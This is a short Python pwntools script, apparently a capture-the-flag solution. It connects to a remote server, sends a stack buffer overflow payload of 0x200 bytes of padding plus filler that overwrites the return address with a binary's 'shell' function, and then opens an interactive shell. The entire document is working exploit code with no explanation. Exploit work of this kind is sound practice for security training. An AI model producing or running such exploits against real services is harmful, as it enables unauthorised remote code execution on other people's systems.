from pwn import *

io = remote('111.200.241.244', 51772)
e = ELF('./pwn4912')
shell_address = e.symbols['shell']
payload = b'a'*0x200 + b'fuckpwn!' + p64(shell_address)
io.sendlineafter(b'>', payload)
io.interactive()